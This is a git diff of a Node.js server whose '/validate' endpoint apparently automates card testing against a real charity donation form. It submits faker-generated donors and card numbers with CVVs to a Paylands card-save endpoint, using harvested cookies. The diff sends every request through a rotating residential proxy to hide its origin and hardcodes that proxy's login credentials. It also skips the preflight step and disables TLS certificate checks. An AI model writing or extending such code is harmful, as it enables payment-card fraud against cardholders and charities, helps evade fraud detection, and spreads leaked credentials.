@@ -3,6 +3,7 @@ const axios = require('axios');
 const https = require('https');
 const path = require('path');
 const faker = require('faker');
+const { HttpsProxyAgent } = require('https-proxy-agent');
 
 const app = express();
 
@@ -15,6 +16,20 @@ app.use(express.static('public'));
 
 // Middleware para ignorar verificación SSL (SOLO DESARROLLO)
 process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
+
+// Configuración del proxy agent Smartproxy (sticky 2 minutos)
+const proxyUrl = 'https://user-spaqiczotq-sessionduration-1:v386AB0aoqFL_icsem@co.smartproxy.com:30001';
+const proxyAgent = new HttpsProxyAgent(proxyUrl);
+
+// Validar proxy al iniciar el servidor
+const url = 'https://ip.smartproxy.com/json';
+axios
+  .get(url, {
+    httpsAgent: proxyAgent,
+  })
+  .then((response) => {
+    console.log(response.data);
+  });
 
 // Utilidad para loguear en consola y en logs
 function addLog(logs, msg) {
@@ -97,9 +112,7 @@ app.post('/validate', async (req, res) => {
     addLog(logs, '🟡 Enviando a endpoint 1 (Pixel)...');
     await sendPixelRequest(logs);
 
-    // Endpoint 2: OPTIONS Preflight
-    addLog(logs, '🟡 Enviando a endpoint 2 (OPTIONS)...');
-    await sendOptionsRequest(logs);
+    // OMITIDO: Endpoint 2 OPTIONS Preflight
 
     // Endpoint 3: GET Form Data (y extraer cookies)
     addLog(logs, '🟡 Enviando a endpoint 3 (GET Form)...');
@@ -223,7 +236,7 @@ async function sendPixelRequest(logs) {
           'X-Requested-With': 'XMLHttpRequest',
           'Content-Type': 'application/x-www-form-urlencoded'
         },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
+        httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 Pixel Status: ${response.status}`);
@@ -233,26 +246,7 @@ async function sendPixelRequest(logs) {
   }
 }
 
-async function sendOptionsRequest(logs) {
-  try {
-    const response = await axios.options(
-      'https://my.afrus.org/api/form/2d90b31c-4ac3-4bd8-9656-0de01743902f',
-      {
-        headers: {
-          'Accept': '*/*',
-          'Access-Control-Request-Method': 'GET',
-          'Access-Control-Request-Headers': 'content-type',
-          'User-Agent': 'Mozilla/5.0'
-        },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
-      }
-    );
-    addLog(logs, `🟢 OPTIONS Status: ${response.status}`);
-  } catch (error) {
-    addLog(logs, `🔴 OPTIONS Error: ${error.message}`);
-    throw error;
-  }
-}
+// OMITIDO: sendOptionsRequest
 
 async function getFormDataWithCookies(logs) {
   try {
@@ -262,7 +256,7 @@ async function getFormDataWithCookies(logs) {
         headers: {
           'Accept': 'application/json'
         },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
+        httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 GET Form Status: ${response.status}`);
@@ -325,7 +319,7 @@ async function leadDonationStart({ cookies, fakeUser, amount, phone }, logs) {
           'Content-Type': 'application/json;charset=UTF-8',
           'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
         },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
+        httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 leadDonationStart Status: ${response.status}`);
@@ -388,7 +382,7 @@ async function donationToken({ cookies, fakeUser, amount, phone }, logs) {
           'Content-Type': 'application/json;charset=UTF-8',
           'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
         },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
+        httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 donation/token Status: ${response.status}`);
@@ -421,7 +415,7 @@ async function paylandsCardSave({ token, number, month, year, cvv }, logs) {
           'Accept': '*/*',
           'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
         },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
+        httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 Paylands Card Save Status: ${response.status}`);
@@ -490,7 +484,7 @@ async function donationFinal({ cookies, fakeUser, amount, phone, uuid }, logs) {
           'Content-Type': 'application/json;charset=UTF-8',
           'Cookie': Object.entries(cookies).map(([k, v]) => `${k}=${v}`).join('; ')
         },
-        httpsAgent: new https.Agent({ rejectUnauthorized: false })
+        httpsAgent: proxyAgent
       }
     );
     addLog(logs, `🟢 donation final Status: ${response.status}`);
